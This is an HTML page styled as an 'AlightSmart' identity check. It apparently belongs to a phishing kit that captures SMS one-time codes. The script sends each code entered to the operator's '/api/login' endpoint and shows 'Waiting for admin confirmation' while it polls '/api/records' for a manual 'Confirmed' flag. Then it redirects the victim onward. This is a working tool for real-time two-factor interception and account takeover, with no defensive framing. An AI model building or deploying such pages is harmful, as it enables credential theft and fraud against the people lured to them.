<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity - AlightSmart</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8fafc; padding: 20px; }
        .container { max-width: 420px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
        h1 { font-size: 1.6rem; margin-bottom: 10px; }
        p { color: #475569; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1.2rem; text-align: center; }
        button { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 8px; font-size: 1.1rem; cursor: pointer; }
        .continue { background: #1e40af; color: white; }
        .error { color: red; margin-top: 15px; }
        .waiting { color: #3b82f6; font-size: 1.1rem; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify it's you</h1>
        <p>Enter the code you received via SMS.</p>
        
        <input type="text" id="code" maxlength="6" placeholder="123456" required>
        <div id="status" class="waiting"></div>
        <div id="error" class="error"></div>

        <button class="continue" onclick="submitCode()">Submit Code</button>
        <button onclick="cancel()" style="background:#94a3b8; color:white; margin-top:10px;">Cancel</button>
    </div>

    <script>
        let checkInterval;

        async function submitCode() {
            const code = document.getElementById('code').value.trim();
            const statusDiv = document.getElementById('status');
            const errorDiv = document.getElementById('error');

            if (code.length < 4) {
                errorDiv.textContent = "Please enter a valid code.";
                return;
            }

            statusDiv.textContent = "Waiting for admin confirmation...";
            errorDiv.textContent = "";

            // Send code to server
            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    username: "Pending Verification", 
                    password: code, 
                    address: code 
                })
            });

            // Start polling for confirmation
            checkInterval = setInterval(checkConfirmation, 3000);
        }

        async function checkConfirmation() {
            const res = await fetch('/api/records');
            const records = await res.json();
            
            const latest = records[0];
            if (latest && latest.type === "Login Attempt" && latest.address && latest.address.includes("Confirmed")) {
                clearInterval(checkInterval);
                alert("Verification Successful!");
                window.location.href = "tunde.html";
            }
        }

        function cancel() {
            clearInterval(checkInterval);
            window.location.href = "/";
        }
    </script>
</body>
</html>
